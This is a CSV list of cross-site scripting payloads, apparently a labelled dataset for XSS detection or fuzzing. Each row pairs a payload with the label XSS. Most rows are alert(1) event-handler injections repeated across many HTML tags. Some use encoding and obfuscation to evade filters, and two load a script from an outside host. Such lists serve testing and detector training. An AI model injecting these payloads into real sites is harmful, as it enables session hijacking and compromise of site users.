payload,attack
<html ontouchstart=alert(1)> ,XSS
<html ontouchend=alert(1)> ,XSS
<html ontouchmove=alert(1)> ,XSS
<html ontouchcancel=alert(1)>,XSS
<body onorientationchange=alert(1)>,XSS
"""><img src=1 onerror=alert(1)>.gif",XSS
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",XSS
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,XSS
"<script src=""data:&comma;alert(1)//",XSS
"""><script src=data:&comma;alert(1)//",XSS
"<script src=""//brutelogic.com.br&sol;1.js&num; ",XSS
"""><script src=//brutelogic.com.br&sol;1.js&num; ",XSS
"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; ",XSS
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",XSS
<base href=//0>,XSS
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",XSS
<body onload=alert(1)>,XSS
<body onpageshow=alert(1)>,XSS
<body onfocus=alert(1)>,XSS
<body onhashchange=alert(1)><a href=#x>click this!#x,XSS
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,XSS
<body onscroll=alert(1)><br><br><br><br>,XSS
<br><br><br><br><br><br><br><br><br><br>,XSS
<br><br><br><br><br><br><br><br><br><br>,XSS
<br><br><br><br><br><br><x id=x>#x,XSS
<body onresize=alert(1)>press F12!,XSS
<body onhelp=alert(1)>press F1! (MSIE),XSS
<marquee onstart=alert(1)>,XSS
<marquee loop=1 width=0 onfinish=alert(1)>,XSS
<audio src onloadstart=alert(1)>,XSS
<video onloadstart=alert(1)><source>,XSS
<input autofocus onblur=alert(1)>,XSS
<keygen autofocus onfocus=alert(1)>,XSS
<form onsubmit=alert(1)><input type=submit>,XSS
<select onchange=alert(1)><option>1<option>2,XSS
<menu id=x contextmenu=x onshow=alert(1)>right click me!,XSS
alert`1`,XSS
alert&lpar;1&rpar;,XSS
alert&#x28;1&#x29,XSS
alert&#40;1&#41,XSS
(alert)(1),XSS
"a=alert,a(1)",XSS
[1].find(alert),XSS
"top[""al""+""ert""](1)",XSS
top[/al/.source+/ert/.source](1),XSS
al\u0065rt(1),XSS
top['al\145rt'](1),XSS
top['al\x65rt'](1),XSS
top[8680439..toString(30)](1),XSS
navigator.vibrate(500),XSS
eval(URL.slice(-8))>#alert(1),XSS
eval(location.hash.slice(1)>#alert(1),XSS
innerHTML=location.hash>#<script>alert(1)</script>,XSS
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",XSS
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",XSS
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",XSS
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",XSS
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",XSS
<a id=x tabindex=1 onactivate=alert(1)></a>,XSS
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,XSS
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,XSS
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,XSS
<a id=x tabindex=1 onfocus=alert(1)></a>,XSS
<a id=x tabindex=1 onfocusin=alert(1)></a>,XSS
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",XSS
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",XSS
"<a onbeforepaste=""alert(1)"" contenteditable>test</a>",XSS
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,XSS
"<a onclick=""alert(1)"">test</a>",XSS
"<a oncontextmenu=""alert(1)"">test</a>",XSS
"<a oncopy=""alert(1)"" contenteditable>test</a>",XSS
"<a oncut=""alert(1)"" contenteditable>test</a>",XSS
"<a ondblclick=""alert(1)"">test</a>",XSS
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,XSS
"<a onkeydown=""alert(1)"" contenteditable>test</a>",XSS
"<a onkeypress=""alert(1)"" contenteditable>test</a>",XSS
"<a onkeyup=""alert(1)"" contenteditable>test</a>",XSS
"<a onmousedown=""alert(1)"">test</a>",XSS
"<a onmouseenter=""alert(1)"">test</a>",XSS
"<a onmouseleave=""alert(1)"">test</a>",XSS
"<a onmousemove=""alert(1)"">test</a>",XSS
"<a onmouseout=""alert(1)"">test</a>",XSS
"<a onmouseover=""alert(1)"">test</a>",XSS
"<a onmouseup=""alert(1)"">test</a>",XSS
"<a onpaste=""alert(1)"" contenteditable>test</a>",XSS
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",XSS
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",XSS
"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",XSS
"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>",XSS
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",XSS
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,XSS
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,XSS
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,XSS
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,XSS
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,XSS
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,XSS
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",XSS
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,XSS
"<abbr onclick=""alert(1)"">test</abbr>",XSS
"<abbr oncontextmenu=""alert(1)"">test</abbr>",XSS
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr ondblclick=""alert(1)"">test</abbr>",XSS
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>,XSS
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",XSS
"<abbr onmousedown=""alert(1)"">test</abbr>",XSS
"<abbr onmouseenter=""alert(1)"">test</abbr>",XSS
"<abbr onmouseleave=""alert(1)"">test</abbr>",XSS
"<abbr onmousemove=""alert(1)"">test</abbr>",XSS
"<abbr onmouseout=""alert(1)"">test</abbr>",XSS
"<abbr onmouseover=""alert(1)"">test</abbr>",XSS
"<abbr onmouseup=""alert(1)"">test</abbr>",XSS
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",XSS
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",XSS
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",XSS
"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",XSS
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",XSS
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",XSS
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,XSS
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,XSS
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,XSS
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,XSS
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,XSS
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,XSS
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",XSS
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,XSS
"<acronym onclick=""alert(1)"">test</acronym>",XSS
"<acronym oncontextmenu=""alert(1)"">test</acronym>",XSS
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym ondblclick=""alert(1)"">test</acronym>",XSS
<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,XSS
"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>",XSS
"<acronym onmousedown=""alert(1)"">test</acronym>",XSS
"<acronym onmouseenter=""alert(1)"">test</acronym>",XSS
"<acronym onmouseleave=""alert(1)"">test</acronym>",XSS
"<acronym onmousemove=""alert(1)"">test</acronym>",XSS
"<acronym onmouseout=""alert(1)"">test</acronym>",XSS
"<acronym onmouseover=""alert(1)"">test</acronym>",XSS
"<acronym onmouseup=""alert(1)"">test</acronym>",XSS
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",XSS
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",XSS
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",XSS
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",XSS
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",XSS
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",XSS
<address id=x tabindex=1 onactivate=alert(1)></address>,XSS
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,XSS
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,XSS
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,XSS
<address id=x tabindex=1 onfocus=alert(1)></address>,XSS
<address id=x tabindex=1 onfocusin=alert(1)></address>,XSS
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",XSS
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",XSS
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",XSS
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,XSS
"<address onclick=""alert(1)"">test</address>",XSS
"<address oncontextmenu=""alert(1)"">test</address>",XSS
"<address oncopy=""alert(1)"" contenteditable>test</address>",XSS
"<address oncut=""alert(1)"" contenteditable>test</address>",XSS
"<address ondblclick=""alert(1)"">test</address>",XSS
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>,XSS
"<address onkeydown=""alert(1)"" contenteditable>test</address>",XSS
"<address onkeypress=""alert(1)"" contenteditable>test</address>",XSS
"<address onkeyup=""alert(1)"" contenteditable>test</address>",XSS
"<address onmousedown=""alert(1)"">test</address>",XSS
"<address onmouseenter=""alert(1)"">test</address>",XSS
"<address onmouseleave=""alert(1)"">test</address>",XSS
"<address onmousemove=""alert(1)"">test</address>",XSS
"<address onmouseout=""alert(1)"">test</address>",XSS
"<address onmouseover=""alert(1)"">test</address>",XSS
"<address onmouseup=""alert(1)"">test</address>",XSS
"<address onpaste=""alert(1)"" contenteditable>test</address>",XSS
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",XSS
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",XSS
"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>",XSS
"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",XSS
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",XSS
<applet id=x tabindex=1 onactivate=alert(1)></applet>,XSS
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,XSS
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,XSS
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,XSS
<applet id=x tabindex=1 onfocus=alert(1)></applet>,XSS
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,XSS
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",XSS
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",XSS
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",XSS
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,XSS
"<applet onclick=""alert(1)"">test</applet>",XSS
"<applet oncontextmenu=""alert(1)"">test</applet>",XSS
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",XSS
"<applet oncut=""alert(1)"" contenteditable>test</applet>",XSS
"<applet ondblclick=""alert(1)"">test</applet>",XSS
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,XSS
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",XSS
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",XSS
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",XSS
"<applet onmousedown=""alert(1)"">test</applet>",XSS
"<applet onmouseenter=""alert(1)"">test</applet>",XSS
"<applet onmouseleave=""alert(1)"">test</applet>",XSS
"<applet onmousemove=""alert(1)"">test</applet>",XSS
"<applet onmouseout=""alert(1)"">test</applet>",XSS
"<applet onmouseover=""alert(1)"">test</applet>",XSS
"<applet onmouseup=""alert(1)"">test</applet>",XSS
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",XSS
<applet onreadystatechange=alert(1)></applet>,XSS
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",XSS
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",XSS
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",XSS
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",XSS
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",XSS
<area id=x tabindex=1 onactivate=alert(1)></area>,XSS
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,XSS
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,XSS
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,XSS
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",XSS
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",XSS
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",XSS
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,XSS
"<area onclick=""alert(1)"">test</area>",XSS
"<area oncontextmenu=""alert(1)"">test</area>",XSS
"<area oncopy=""alert(1)"" contenteditable>test</area>",XSS
"<area oncut=""alert(1)"" contenteditable>test</area>",XSS
"<area ondblclick=""alert(1)"">test</area>",XSS
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,XSS
"<area onkeydown=""alert(1)"" contenteditable>test</area>",XSS
"<area onkeypress=""alert(1)"" contenteditable>test</area>",XSS
"<area onkeyup=""alert(1)"" contenteditable>test</area>",XSS
"<area onmousedown=""alert(1)"">test</area>",XSS
"<area onmouseenter=""alert(1)"">test</area>",XSS
"<area onmouseleave=""alert(1)"">test</area>",XSS
"<area onmousemove=""alert(1)"">test</area>",XSS
"<area onmouseout=""alert(1)"">test</area>",XSS
"<area onmouseover=""alert(1)"">test</area>",XSS
"<area onmouseup=""alert(1)"">test</area>",XSS
"<area onpaste=""alert(1)"" contenteditable>test</area>",XSS
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",XSS
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",XSS
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",XSS
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",XSS
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",XSS
<article id=x tabindex=1 onactivate=alert(1)></article>,XSS
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,XSS
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,XSS
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,XSS
<article id=x tabindex=1 onfocus=alert(1)></article>,XSS
<article id=x tabindex=1 onfocusin=alert(1)></article>,XSS
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",XSS
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",XSS
"<article onbeforepaste=""alert(1)"" contenteditable>test</article>",XSS
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>,XSS
"<article onclick=""alert(1)"">test</article>",XSS
"<article oncontextmenu=""alert(1)"">test</article>",XSS
"<article oncopy=""alert(1)"" contenteditable>test</article>",XSS
"<article oncut=""alert(1)"" contenteditable>test</article>",XSS
"<article ondblclick=""alert(1)"">test</article>",XSS
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,XSS
"<article onkeydown=""alert(1)"" contenteditable>test</article>",XSS
"<article onkeypress=""alert(1)"" contenteditable>test</article>",XSS
"<article onkeyup=""alert(1)"" contenteditable>test</article>",XSS
"<article onmousedown=""alert(1)"">test</article>",XSS
"<article onmouseenter=""alert(1)"">test</article>",XSS
"<article onmouseleave=""alert(1)"">test</article>",XSS
"<article onmousemove=""alert(1)"">test</article>",XSS
"<article onmouseout=""alert(1)"">test</article>",XSS
"<article onmouseover=""alert(1)"">test</article>",XSS
"<article onmouseup=""alert(1)"">test</article>",XSS
"<article onpaste=""alert(1)"" contenteditable>test</article>",XSS
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",XSS
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>",XSS
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",XSS
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",XSS
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",XSS
<aside id=x tabindex=1 onactivate=alert(1)></aside>,XSS
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,XSS
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,XSS
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,XSS
<aside id=x tabindex=1 onfocus=alert(1)></aside>,XSS
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,XSS
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",XSS
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",XSS
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",XSS
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,XSS
"<aside onclick=""alert(1)"">test</aside>",XSS
"<aside oncontextmenu=""alert(1)"">test</aside>",XSS
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",XSS
"<aside oncut=""alert(1)"" contenteditable>test</aside>",XSS
"<aside ondblclick=""alert(1)"">test</aside>",XSS
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,XSS
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",XSS
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",XSS
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",XSS
"<aside onmousedown=""alert(1)"">test</aside>",XSS
"<aside onmouseenter=""alert(1)"">test</aside>",XSS
"<aside onmouseleave=""alert(1)"">test</aside>",XSS
"<aside onmousemove=""alert(1)"">test</aside>",XSS
"<aside onmouseout=""alert(1)"">test</aside>",XSS
"<aside onmouseover=""alert(1)"">test</aside>",XSS
"<aside onmouseup=""alert(1)"">test</aside>",XSS
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",XSS
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",XSS
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",XSS
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",XSS
"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",XSS
"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>",XSS
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",XSS
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",XSS
<audio id=x tabindex=1 onactivate=alert(1)></audio>,XSS
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,XSS
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,XSS
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,XSS
"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",XSS
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",XSS
"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>",XSS
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>,XSS
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio onclick=""alert(1)"">test</audio>",XSS
"<audio oncontextmenu=""alert(1)"">test</audio>",XSS
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",XSS
"<audio oncut=""alert(1)"" contenteditable>test</audio>",XSS
"<audio ondblclick=""alert(1)"">test</audio>",XSS
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>,XSS
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",XSS
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",XSS
"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",XSS
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",XSS
"<audio onmousedown=""alert(1)"">test</audio>",XSS
"<audio onmouseenter=""alert(1)"">test</audio>",XSS
"<audio onmouseleave=""alert(1)"">test</audio>",XSS
"<audio onmousemove=""alert(1)"">test</audio>",XSS
"<audio onmouseout=""alert(1)"">test</audio>",XSS
"<audio onmouseover=""alert(1)"">test</audio>",XSS
"<audio onmouseup=""alert(1)"">test</audio>",XSS
"<audio onpaste=""alert(1)"" contenteditable>test</audio>",XSS
<audio src/onerror=alert(1)>,XSS
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",XSS
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",XSS
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",XSS
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",XSS
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",XSS
<b id=x tabindex=1 onactivate=alert(1)></b>,XSS
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,XSS
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,XSS
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,XSS
<b id=x tabindex=1 onfocus=alert(1)></b>,XSS
<b id=x tabindex=1 onfocusin=alert(1)></b>,XSS
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",XSS
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",XSS
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",XSS
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,XSS
"<b onclick=""alert(1)"">test</b>",XSS
"<b oncontextmenu=""alert(1)"">test</b>",XSS
"<b oncopy=""alert(1)"" contenteditable>test</b>",XSS
